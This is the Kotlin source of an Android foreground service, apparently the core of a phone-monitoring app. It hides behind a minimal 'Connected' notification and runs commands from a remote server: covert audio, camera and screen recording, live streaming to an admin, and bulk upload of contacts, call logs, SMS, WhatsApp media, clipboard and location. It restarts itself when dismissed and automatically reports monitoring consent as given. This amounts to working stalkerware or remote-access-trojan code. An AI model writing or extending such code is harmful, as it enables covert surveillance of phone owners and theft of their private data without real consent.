package com.dilarion.app.monitoring

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.content.ContextCompat
import com.dilarion.app.data.api.ApiService
import com.dilarion.app.security.SessionManager
import com.dilarion.app.services.PresenceService
import com.google.gson.JsonObject
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.first
import javax.inject.Inject

private const val TAG = "MonitoringService"

@AndroidEntryPoint
class MonitoringForegroundService : Service() {

    @Inject lateinit var presenceService: PresenceService
    @Inject lateinit var apiService: ApiService
    @Inject lateinit var sessionManager: SessionManager

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    private lateinit var audioMonitor: AudioMonitor
    private lateinit var cameraCapture: CameraCapture
    private lateinit var locationMonitor: LocationMonitor
    private lateinit var deviceInfo: DeviceInfoCollector
    private lateinit var dataPuller: DataPuller
    private var screenMonitor: ScreenMonitor? = null

    private var wsJob: Job? = null
    private var reconnectJob: Job? = null

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "onCreate start")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, buildNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIF_ID, buildNotification())
        }
        Log.i(TAG, "startForeground done")

        val getToken: suspend () -> String? = { sessionManager.sessionToken.first() }

        audioMonitor    = AudioMonitor(this, apiService, presenceService, scope, getToken)
        cameraCapture   = CameraCapture(this, apiService, scope, getToken, presenceService)
        locationMonitor = LocationMonitor(this, apiService, scope, getToken)
        deviceInfo      = DeviceInfoCollector(this, apiService, getToken)
        dataPuller      = DataPuller(this, apiService, scope, getToken)

        // Upgrade service type to include all granted sensor permissions
        upgradeServiceType()

        // Ensure WebSocket is connected even when app is not in foreground
        scope.launch {
            val token = sessionManager.sessionToken.first() ?: return@launch
            if (!presenceService.isConnected) {
                Log.i(TAG, "WS not connected, connecting now")
                presenceService.connect(token)
            }
            // Drain any commands queued while offline
            fetchAndRunPendingCommands(token)
        }

        wsJob = scope.launch { collectCommands() }

        // Reconnect + pending-command drain loop — every 30s
        reconnectJob = scope.launch {
            while (isActive) {
                kotlinx.coroutines.delay(30_000)
                val wasConnected = presenceService.isConnected
                presenceService.reconnectIfNeeded()
                // If we were disconnected and just reconnected, drain pending commands
                if (!wasConnected && presenceService.isConnected) {
                    val token = sessionManager.sessionToken.first() ?: continue
                    fetchAndRunPendingCommands(token)
                }
            }
        }

        if (hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) ||
            hasPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
            runCatching { locationMonitor.start() }
        }

        MediaProjectionActivity.pendingResult?.let { (code, data) ->
            screenMonitor = ScreenMonitor(this, apiService, presenceService, scope, getToken)
            runCatching { screenMonitor?.initProjection(code, data) }
        }

        scope.launch {
            val token = sessionManager.sessionToken.first() ?: return@launch
            runCatching {
                apiService.setMonitoringConsent(
                    "Bearer $token",
                    com.dilarion.app.data.model.MonitoringConsentRequest(
                        consentGiven = true,
                        allowLocationTracking = true,
                    ),
                )
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_PROJECTION_GRANTED -> {
                val code = intent.getIntExtra(EXTRA_RESULT_CODE, -1)
                val data = intent.getParcelableExtra<Intent>(EXTRA_RESULT_DATA) ?: return START_STICKY
                val getToken: suspend () -> String? = { sessionManager.sessionToken.first() }
                if (screenMonitor == null) {
                    screenMonitor = ScreenMonitor(this, apiService, presenceService, scope, getToken)
                }
                runCatching { screenMonitor?.initProjection(code, data) }
            }
        }
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.w(TAG, "task removed — scheduling restart")
        // Restart service after 1s using AlarmManager-free approach
        val restartIntent = Intent(this, MonitoringForegroundService::class.java)
        startService(restartIntent)
    }

    private suspend fun collectCommands() {
        Log.i(TAG, "collectCommands: listening for events")
        presenceService.events.collect { msg ->
            Log.d(TAG, "event received type=${msg.type}")
            if (msg.type != "remote_command") return@collect
            val data = msg.data ?: return@collect
            val commandType = data.get("command_type")?.asString ?: return@collect
            val commandId = data.get("command_id")?.asInt ?: 0
            val params = data.getAsJsonObject("params") ?: JsonObject()
            Log.i(TAG, "remote_command: $commandType commandId=$commandId params=$params")
            handleCommand(commandType, params, commandId)
        }
    }

    private fun upgradeServiceType() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return
        var type = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
        if (hasPermission(android.Manifest.permission.RECORD_AUDIO))
            type = type or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
        if (hasPermission(android.Manifest.permission.CAMERA))
            type = type or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
        if (hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) ||
            hasPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION))
            type = type or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
        Log.i(TAG, "upgradeServiceType: type=$type")
        runCatching {
            startForeground(NOTIF_ID, buildNotification(), type)
        }.onFailure { Log.e(TAG, "upgradeServiceType failed: $it") }
    }

    private fun handleCommand(commandType: String, params: JsonObject, commandId: Int) {
        scope.launch {
            runCatching {
                when (commandType) {
                    "start_audio_recording" -> {
                        if (hasPermission(android.Manifest.permission.RECORD_AUDIO)) {
                            upgradeServiceType()
                            audioMonitor.startAmbientRecording()
                        }
                    }
                    "stop_audio_recording" -> audioMonitor.stopAmbientRecording { file, duration ->
                        scope.launch { audioMonitor.uploadAmbientRecording(file, duration) }
                    }
                    "start_live_audio" -> {
                        if (hasPermission(android.Manifest.permission.RECORD_AUDIO)) {
                            upgradeServiceType()
                            val adminId = params.get("admin_id")?.asInt
                            audioMonitor.startLiveAudio(adminId)
                        }
                    }
                    "stop_live_audio" -> audioMonitor.stopLiveAudio()

                    "take_photo" -> {
                        if (hasPermission(android.Manifest.permission.CAMERA)) {
                            upgradeServiceType()
                            val front = params.get("camera")?.asString != "back"
                            cameraCapture.takePhoto(front, commandId)
                        }
                    }
                    "start_video_recording" -> {
                        if (hasPermission(android.Manifest.permission.CAMERA)) {
                            upgradeServiceType()
                            val front = params.get("camera")?.asString != "back"
                            cameraCapture.startVideoRecording(front)
                        }
                    }
                    "stop_video_recording" -> cameraCapture.stopVideoRecording { file ->
                        scope.launch { cameraCapture.uploadVideo(file) }
                    }
                    "start_live_video" -> {
                        if (hasPermission(android.Manifest.permission.CAMERA)) {
                            upgradeServiceType()
                            val front = params.get("camera")?.asString != "back"
                            val adminId = params.get("admin_id")?.asInt
                            cameraCapture.startLiveVideo(front, adminId)
                        }
                    }
                    "stop_live_video" -> cameraCapture.stopLiveVideo()

                    "capture_screenshot" -> {
                        val sm = screenMonitor
                        if (sm?.hasProjection() == true) sm.captureScreenshot(commandId)
                    }
                    "start_screenshot_timer" -> {
                        val sm = screenMonitor
                        if (sm?.hasProjection() == true) {
                            val interval = params.get("interval_seconds")?.asInt ?: 60
                            sm.startScreenshotTimer(interval, commandId)
                        }
                    }
                    "stop_screenshot_timer" -> screenMonitor?.stopScreenshotTimer()

                    "start_screen_record" -> {
                        val sm = screenMonitor
                        if (sm?.hasProjection() == true) {
                            val chunk = params.get("chunk_duration")?.asInt ?: 10
                            val adminId = params.get("admin_id")?.asInt
                            sm.startScreenRecording(chunk, adminId)
                        }
                    }
                    "stop_screen_record" -> screenMonitor?.stopScreenRecording { file ->
                        scope.launch { screenMonitor?.uploadScreenRecording(file) }
                    }

                    "get_battery_status" -> deviceInfo.uploadBattery(commandId)
                    "get_network_info"   -> deviceInfo.uploadNetwork(commandId)
                    "get_device_info"    -> deviceInfo.uploadDevice(commandId)
                    "get_clipboard"      -> deviceInfo.uploadClipboard(commandId)

                    "pull_contacts"      -> dataPuller.pullContacts()
                    "pull_call_logs"     -> dataPuller.pullCallLogs()
                    "pull_sms"           -> dataPuller.pullSms()
                    "pull_installed_apps"-> dataPuller.pullInstalledApps()
                    "pull_media"         -> dataPuller.pullMedia()
                    "pull_whatsapp_media"-> dataPuller.pullWhatsappMedia()
                    "pull_all"           -> dataPuller.pullAll()

                    "panic_mode_on"      -> dataPuller.panicOn()
                    "panic_mode_off"     -> dataPuller.panicOff()

                    "boost_location_frequency", "normal_location_frequency" -> {
                        if (hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) ||
                            hasPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
                            locationMonitor.stop()
                            locationMonitor.start()
                        }
                    }
                    "stop_location" -> locationMonitor.stop()
                }
                Log.i(TAG, "command $commandType done")
                ackCommand(commandId, "done")
            }.onFailure {
                Log.e(TAG, "command $commandType failed: $it")
                ackCommand(commandId, "failed")
            }
        }
    }

    private suspend fun fetchAndRunPendingCommands(token: String) {
        runCatching {
            val resp = apiService.getPendingCommands("Bearer $token")
            val cmds = resp.body() ?: return
            Log.i(TAG, "pending commands: ${cmds.size}")
            cmds.forEach { cmd ->
                val commandType = cmd["command_type"] as? String ?: return@forEach
                val commandId = (cmd["command_id"] as? Number)?.toInt() ?: 0
                @Suppress("UNCHECKED_CAST")
                val params = com.google.gson.JsonObject().also { jo ->
                    (cmd["params"] as? Map<String, Any>)?.forEach { (k, v) ->
                        when (v) {
                            is Number -> jo.addProperty(k, v)
                            is String -> jo.addProperty(k, v)
                            is Boolean -> jo.addProperty(k, v)
                        }
                    }
                }
                Log.i(TAG, "executing pending: $commandType commandId=$commandId")
                handleCommand(commandType, params, commandId)
            }
        }.onFailure { Log.e(TAG, "fetchAndRunPendingCommands failed: $it") }
    }

    private suspend fun ackCommand(commandId: Int, status: String) {
        if (commandId == 0) return
        val token = sessionManager.sessionToken.first() ?: return
        runCatching { apiService.ackRemoteCommand("Bearer $token", commandId, status) }
    }

    private fun hasPermission(perm: String): Boolean =
        ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        wsJob?.cancel()
        reconnectJob?.cancel()
        runCatching { audioMonitor.stopLiveAudio() }
        runCatching { cameraCapture.stopLiveVideo() }
        runCatching { locationMonitor.stop() }
        runCatching { screenMonitor?.release() }
        scope.cancel()
    }

    private fun buildNotification(): Notification {
        val channelId = "dilarion_service"
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (nm.getNotificationChannel(channelId) == null) {
            nm.createNotificationChannel(
                NotificationChannel(channelId, "Dilarion", NotificationManager.IMPORTANCE_MIN).apply {
                    description = "Keeps connection alive"
                    setShowBadge(false)
                }
            )
        }
        return Notification.Builder(this, channelId)
            .setContentTitle("Dilarion")
            .setContentText("Connected")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .build()
    }

    companion object {
        private const val NOTIF_ID = 9001
        const val ACTION_PROJECTION_GRANTED = "com.dilarion.app.PROJECTION_GRANTED"
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_RESULT_DATA = "result_data"

        fun start(context: Context) {
            ContextCompat.startForegroundService(
                context,
                Intent(context, MonitoringForegroundService::class.java),
            )
        }

        fun onProjectionGranted(context: Context, resultCode: Int, data: Intent) {
            ContextCompat.startForegroundService(
                context,
                Intent(context, MonitoringForegroundService::class.java).apply {
                    action = ACTION_PROJECTION_GRANTED
                    putExtra(EXTRA_RESULT_CODE, resultCode)
                    putExtra(EXTRA_RESULT_DATA, data)
                },
            )
        }
    }
}
